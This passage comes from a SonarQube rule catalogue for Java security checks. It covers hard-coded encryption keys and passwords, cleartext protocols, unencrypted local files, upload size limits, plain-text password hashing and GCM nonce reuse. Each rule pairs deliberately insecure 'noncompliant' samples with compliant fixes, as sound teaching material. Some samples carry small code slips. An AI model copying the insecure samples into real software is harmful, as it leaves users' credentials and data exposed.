biometricPrompt.authenticate(promptInfo, new BiometricPrompt.CryptoObject(cipher)); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://developer.android.com/training/sign-in/biometric-auth" rel="nofollow">developer.android.com</a> - Use a cryptographic solution that depends
  on authentication </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication" rel="nofollow">OWASP Mobile Top 10 Category M4</a> - Insecure
  Authentication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x09-v4-authentication_and_session_management_requirements" rel="nofollow">OWASP
  MASVS</a> - Authentication and Session Management Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/287" rel="nofollow">MITRE, CWE-287</a> - Improper Authentication </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6301">
              java:S6301
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Storing data locally is a common task for mobile applications. There are many convenient solutions that allow storing data persistently, for
example SQLiteDatabase and Realm. These systems can be initialized with a secret key in order to store the data encrypted.</p>
<p>The encryption key is meant to stay secret and should not be hard-coded in the application as it would mean that:</p>
<ul><li> All user would use the same encryption key. </li><li> The encryption key would be known by anyone who as access to the source code or the application binary code. </li><li> Data stored encrypted in the database would not be protected. </li></ul>
<p>There are different approaches how the key can be provided to encrypt and decrypt the database. One of the most convinient way to is to rely on
<code>EncryptedSharedPreferences</code> to store encryption keys. It can also be provided dynamically by the user of the application or fetched from a
remote server.</p>
<h3>Noncompliant code example</h3>
<p><a href="https://www.zetetic.net/sqlcipher/sqlcipher-for-android/" rel="nofollow">SQLCipher</a></p>
<pre>
String key &#61; &#34;gb09ym9ydoolp3w886d0tciczj6ve9kszqd65u7d126040gwy86xqimjpuuc788g&#34;;
SQLiteDatabase db &#61; SQLiteDatabase.openOrCreateDatabase(&#34;test.db&#34;, key, null); // Noncompliant
</pre>
<p><a href="https://github.com/realm/realm-java/" rel="nofollow">Realm</a></p>
<pre>
String key &#61; &#34;gb09ym9ydoolp3w886d0tciczj6ve9kszqd65u7d126040gwy86xqimjpuuc788g&#34;;
RealmConfiguration config &#61; new RealmConfiguration.Builder();
    .encryptionKey(key.toByteArray()) // Noncompliant
    .build();
Realm realm &#61; Realm.getInstance(config);
</pre>
<h3>Compliant solution</h3>
<p><a href="https://www.zetetic.net/sqlcipher/sqlcipher-for-android/" rel="nofollow">SQLCipher</a></p>
<pre>
SQLiteDatabase db &#61; SQLiteDatabase.openOrCreateDatabase(&#34;test.db&#34;, getKey(), null);
</pre>
<p><a href="https://github.com/realm/realm-java/" rel="nofollow">Realm</a></p>
<pre>
RealmConfiguration config &#61; new RealmConfiguration.Builder()
    .encryptionKey(getKey())
    .build();
Realm realm &#61; Realm.getInstance(config);
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage" rel="nofollow">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://cwe.mitre.org/data/definitions/321" rel="nofollow">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2068">
              java:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, passwords should not be hard-coded. This is particularly true for
applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Passwords should be stored outside of the code in a configuration file, a database, or a password management service.</p>
<p>This rule flags instances of hard-coded passwords used in database and LDAP connections. It looks for hard-coded passwords in connection strings,
and for variable names that match any of the patterns from the provided list.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The password allows access to a sensitive component like a database, a file storage, an API, or a service. </li><li> The password is used in production environments. </li><li> Application re-distribution is required before updating the password. </li></ul>
<p>There would be a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
String username &#61; &#34;steve&#34;;
String password &#61; &#34;blue&#34;;
Connection conn &#61; DriverManager.getConnection(&#34;jdbc:mysql://localhost/test?&#34; &#43;
                  &#34;user&#61;&#34; &#43; username &#43; &#34;&amp;password&#61;&#34; &#43; password); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
String username &#61; getEncryptedUser();
String password &#61; getEncryptedPassword();
Connection conn &#61; DriverManager.getConnection(&#34;jdbc:mysql://localhost/test?&#34; &#43;
                  &#34;user&#61;&#34; &#43; username &#43; &#34;&amp;password&#61;&#34; &#43; password);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5332">
              java:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<p>These clients from <a href="https://commons.apache.org/proper/commons-net/" rel="nofollow">Apache commons net</a> libraries are based on unencrypted protocols and
are not recommended:</p>
<pre>
TelnetClient telnet &#61; new TelnetClient(); // Sensitive

FTPClient ftpClient &#61; new FTPClient(); // Sensitive

SMTPClient smtpClient &#61; new SMTPClient(); // Sensitive
</pre>
<p>Unencrypted HTTP connections, when using <a href="https://square.github.io/okhttp/https/" rel="nofollow">okhttp</a> library for instance, should be avoided:</p>
<pre>
ConnectionSpec spec &#61; new ConnectionSpec.Builder(ConnectionSpec.CLEARTEXT) // Sensitive
  .build();
</pre>
<p>Android WebView can be configured to allow a secure origin to load content from any other origin, even if that origin is insecure (mixed
content):</p>
<pre>
import android.webkit.WebView

WebView webView &#61; findViewById(R.id.webview)
webView.getSettings().setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use instead these clients from <a href="https://commons.apache.org/proper/commons-net/" rel="nofollow">Apache commons net</a> and <a href="http://www.jcraft.com/jsch/" rel="nofollow">JSch/ssh</a> library:</p>
<pre>
JSch jsch &#61; new JSch();

if(implicit) {
  // implicit mode is considered deprecated but offer the same security than explicit mode
  FTPSClient ftpsClient &#61; new FTPSClient(true);
}
else {
  FTPSClient ftpsClient &#61; new FTPSClient();
}

if(implicit) {
  // implicit mode is considered deprecated but offer the same security than explicit mode
  SMTPSClient smtpsClient &#61; new SMTPSClient(true);
}
else {
  SMTPSClient smtpsClient &#61; new SMTPSClient();
  smtpsClient.connect(&#34;127.0.0.1&#34;, 25);
  if (smtpsClient.execTLS()) {
    // commands
  }
}
</pre>
<p>Perform HTTP encrypted connections, with <a href="https://square.github.io/okhttp/https/" rel="nofollow">okhttp</a> library for instance:</p>
<pre>
ConnectionSpec spec &#61; new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
  .build();
</pre>
<p>The most secure mode for Android WebView is <code>MIXED_CONTENT_NEVER_ALLOW</code>:</p>
<pre>
import android.webkit.WebView

WebView webView &#61; findViewById(R.id.webview)
webView.getSettings().setMixedContentMode(MIXED_CONTENT_NEVER_ALLOW);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6300">
              java:S6300
            </a>
          </td>
          <td>
            <details>
              <p>Storing files locally is a common task for mobile applications. Files that are stored unencrypted can be read out and modified by an attacker with
physical access to the device. Access to sensitive data can be harmful for the user of the application, for example when the device gets stolen.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The file contains sensitive data that could cause harm when leaked. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to password-encrypt local files that contain sensitive information. The class <a href="https://developer.android.com/reference/androidx/security/crypto/EncryptedFile" rel="nofollow">EncryptedFile</a> can be used to easily encrypt files.</p>
<h2>Sensitive Code Example</h2>
<pre>
Files.write(path, content); // Sensitive

FileOutputStream out &#61; new FileOutputStream(file); // Sensitive

FileWriter fw &#61; new FileWriter(&#34;outfilename&#34;, false); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
String masterKeyAlias &#61; MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);

File file &#61; new File(context.getFilesDir(), &#34;secret_data&#34;);
EncryptedFile encryptedFile &#61; EncryptedFile.Builder(
    file,
    context,
    masterKeyAlias,
    EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB
).build();

// write to the encrypted file
FileOutputStream encryptedOutputStream &#61; encryptedFile.openFileOutput();
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage" rel="nofollow">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5693">
              java:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevents DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> size limits are not defined for the different resources of the web application. </li><li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting" rel="nofollow">rate limiting</a> features. </li><li> the web application infrastructure has limited resources. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul><li> lower or equal to 8mb for file uploads. </li><li> lower or equal to 2mb for other requests. </li></ul>  </li></ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<p>With default limit value of 8388608 (8MB).</p>
<p>A 100 MB file is allowed to be uploaded:</p>
<pre>
&#64;Bean(name &#61; &#34;multipartResolver&#34;)
public CommonsMultipartResolver multipartResolver() {
  CommonsMultipartResolver multipartResolver &#61; new CommonsMultipartResolver();
  multipartResolver.setMaxUploadSize(104857600); // Sensitive (100MB)
  return multipartResolver;
}

&#64;Bean(name &#61; &#34;multipartResolver&#34;)
public CommonsMultipartResolver multipartResolver() {
  CommonsMultipartResolver multipartResolver &#61; new CommonsMultipartResolver(); // Sensitive, by default if maxUploadSize property is not defined, there is no limit and thus it&#39;s insecure
  return multipartResolver;
}

&#64;Bean
public MultipartConfigElement multipartConfigElement() {
  MultipartConfigFactory factory &#61; new MultipartConfigFactory(); // Sensitive, no limit by default
  return factory.createMultipartConfig();
}
</pre>
<h2>Compliant Solution</h2>
<p>File upload size is limited to 8 MB:</p>
<pre>
&#64;Bean(name &#61; &#34;multipartResolver&#34;)
public CommonsMultipartResolver multipartResolver() {
  multipartResolver.setMaxUploadSize(8388608); // Compliant (8 MB)
  return multipartResolver;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html" rel="nofollow">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/770" rel="nofollow">MITRE, CWE-770</a> - Allocation of Resources Without Limits or Throttling </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6437">
              java:S6437
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>A hard-coded secret has been found in your code. You should quickly list where this secret is used, revoke it, and then change it in every system
that uses it.</p>
<p>Passwords, secrets, and any type of credentials should only be used to authenticate a single entity (a person or a system).</p>
<p>If you allow third parties to authenticate as another system or person, they can impersonate legitimate identities and undermine trust within the
organization.<br /> It does not matter if the impersonation is malicious: In either case, it is a clear breach of trust in the system, as the systems
involved falsely assume that the authenticated entity is who it claims to be.<br /> The consequences can be catastrophic.</p>
<p>Keeping credentials in plain text in a code base is tantamount to sharing that password with anyone who has access to the source code and runtime
servers.<br /> Thus, it is a breach of trust, as these individuals have the ability to impersonate others.</p>
<p>Secret management services are the most efficient tools to store credentials and protect the identities associated with them.<br /> Cloud providers
and on-premise services can be used for this purpose.</p>
<p>If storing credentials in a secret data management service is not possible, follow these guidelines:</p>
<ul><li> Do not store credentials in a file that an excessive number of people can access.
    <ul><li> For example, not in code, not in a spreadsheet, not on a sticky note, and not on a shared drive. </li></ul>  </li><li> Use the production operating system to protect password access control.
    <ul><li> For example, in a file whose permissions are restricted and protected with chmod and chown. </li></ul>  </li></ul>
<h3>Noncompliant code example</h3>
<pre>
import org.h2.security.SHA256;

String inputString &#61; &#34;s3cr37&#34;;
byte[] key         &#61; inputString.getBytes();

SHA256.getHMAC(key, message);  // Noncompliant
</pre>
<h3>Compliant solution</h3>
<p>Using <a href="https://github.com/awsdocs/aws-doc-sdk-examples/tree/main/javav2/example_code/secretsmanager" rel="nofollow">AWS Secrets Manager</a>:</p>
<pre>
import software.amazon.awssdk.services.secretsmanager.SecretsManagerClient;
import software.amazon.awssdk.services.secretsmanager.model.GetSecretValueRequest;
import software.amazon.awssdk.services.secretsmanager.model.GetSecretValueResponse;
import org.h2.security.SHA256;

public static void doSomething(SecretsManagerClient secretsClient, String secretName) {
  GetSecretValueRequest valueRequest &#61; GetSecretValueRequest.builder()
    .secretId(secretName)
    .build();

  GetSecretValueResponse valueResponse &#61; secretsClient.getSecretValue(valueRequest);
  String secret                        &#61; valueResponse.secretString();

  byte[] key &#61; secret.getBytes();
  SHA256.getHMAC(key, message);
}
</pre>
<p>Using <a href="https://docs.microsoft.com/en-us/azure/key-vault/secrets/quick-create-java?tabs&#61;azure-cli" rel="nofollow">Azure Key Vault Secret</a>:</p>
<pre>
import com.azure.identity.DefaultAzureCredentialBuilder;
import com.azure.security.keyvault.secrets.SecretClient;
import com.azure.security.keyvault.secrets.SecretClientBuilder;
import com.azure.security.keyvault.secrets.models.KeyVaultSecret;
import org.h2.security.SHA256;

public static void doSomething(SecretClient secretClient, String secretName) {
  KeyVaultSecret retrievedSecret &#61; secretClient.getSecret(secretName);
  String secret &#61; retrievedSecret.getValue();

  byte[] key &#61; secret.getBytes();
  SHA256.getHMAC(key, message);
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://aws.amazon.com/fr/secrets-manager/" rel="nofollow">AWS</a> - Secret Manager </li><li> <a href="https://azure.microsoft.com/fr-fr/services/key-vault/" rel="nofollow">Azure</a> - Key Vault </li><li> <a href="https://cloud.google.com/secret-manager" rel="nofollow">GCP</a> - Secret Manager </li><li> <a href="https://www.vaultproject.io/" rel="nofollow">Hashicorp Vault</a> - Secret Management </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/798.html" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259.html" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5344">
              java:S5344
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>A user password should never be stored in clear-text, instead a hash should be produced from it using a secure algorithm:</p>
<ul><li> not vulnerable to <code>brute force attacks</code>. </li><li> not vulnerable to <code>collision attacks</code> (see rule s4790). </li><li> and a salt should be added to the password to lower the risk of <code>rainbow table attacks</code> (see rule s2053). </li></ul>
<p>This rule raises an issue when a password is stored in clear-text or with a hash algorithm vulnerable to <code>bruce force attacks</code>. These
algorithms, like <code>md5</code> or <code>SHA-family</code> functions are fast to compute the hash and therefore brute force attacks are possible
(it’s easier to exhaust the entire space of all possible passwords) especially with hardware like GPU, FPGA or ASIC. Modern password hashing
algorithms such as <code>bcrypt</code>, <code>PBKDF2</code> or <code>argon2</code> are recommended.</p>
<h3>Noncompliant code example</h3>
<pre>
&#64;Autowired
public void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {
  auth.jdbcAuthentication()
    .dataSource(dataSource)
    .usersByUsernameQuery(&#34;SELECT * FROM users WHERE username &#61; ?&#34;)
    .passwordEncoder(new StandardPasswordEncoder()); // Noncompliant

  // OR
  auth.jdbcAuthentication()
    .dataSource(dataSource)
    .usersByUsernameQuery(&#34;SELECT * FROM users WHERE username &#61; ?&#34;); // Noncompliant; default uses plain-text

  // OR
  auth.userDetailsService(...); // Noncompliant; default uses plain-text
  // OR
  auth.userDetailsService(...).passwordEncoder(new StandardPasswordEncoder()); // Noncompliant
}
</pre>
<h3>Compliant solution</h3>
<pre>
&#64;Autowired
public void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {
  auth.jdbcAuthentication()
    .dataSource(dataSource)
    .usersByUsernameQuery(&#34;Select * from users where username&#61;?&#34;)
    .passwordEncoder(new BCryptPasswordEncoder());

  // or
  auth.userDetailsService(null).passwordEncoder(new BCryptPasswordEncoder());
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html" rel="nofollow">OWASP CheatSheet</a> - Password Storage Cheat Sheet
  </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/256" rel="nofollow">MITRE, CWE-256</a> - Plaintext Storage of a Password </li><li> <a href="https://cwe.mitre.org/data/definitions/916" rel="nofollow">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6432">
              java:S6432
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>When encrypting data with Counter (CTR) derived block cipher modes of operation, it is essential not to reuse the same initialization vector (IV)
with a given key, such IV is called a &#34;nonce&#34; (number used only once). Galois/Counter (GCM) and Counter with Cipher Block Chaining-Message
Authentication Code (CCM) are both CTR-based modes of operation.</p>
<p>An attacker, who has knowledge of one plaintext (original content) and ciphertext (encrypted content) pair, is able to retrieve the corresponding
plaintext of any other ciphertext generated with the same IV and key. It also drastically decreases the key recovery computational complexity by
downgrading it to a simpler polynomial root-finding problem.</p>
<p>When using GCM, NIST recommends a 96 bit length nonce using a &#39;Deterministic&#39; approach or at least 96 bits using a &#39;Random Bit Generator (RBG)&#39;.
The &#39;Deterministic&#39; construction involves a counter, which increments per encryption process. The &#39;RBG&#39; construction, as the name suggests, generates
the nonce using a random bit generator. Collision probabilities (nonce-key pair reuse) using the &#39;RBG-based&#39; approach require a shorter key rotation
period, 2^32 maximum invocations per key.</p>
<h3>Noncompliant code example</h3>
<pre>
public void encrypt(byte[] key, byte[] ptxt) {
    byte[] bytesIV &#61; &#34;7cVgr5cbdCZV&#34;.getBytes(&#34;UTF-8&#34;); // The initialization vector is a static value

    GCMParameterSpec gcmSpec    &#61; new GCMParameterSpec(128, nonce); // The initialization vector is configured here
    SecretKeySpec keySpec       &#61; new SecretKeySpec(key, &#34;AES&#34;);

    Cipher cipher &#61; Cipher.getInstance(&#34;AES/GCM/NoPadding&#34;);
    cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);  // Noncompliant
}
</pre>
<h3>Compliant solution</h3>
<pre>
public void encrypt(byte[] key, byte[] ptxt) {
    SecureRandom random &#61; new SecureRandom();
    byte[] bytesIV &#61; new byte[12];
    random.nextBytes(bytesIV); // Random 96 bit IV

    GCMParameterSpec gcmSpec    &#61; new GCMParameterSpec(128, nonce);
    SecretKeySpec keySpec       &#61; new SecretKeySpec(key, &#34;AES&#34;);

    Cipher cipher &#61; Cipher.getInstance(&#34;AES/GCM/NoPadding&#34;);
    cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
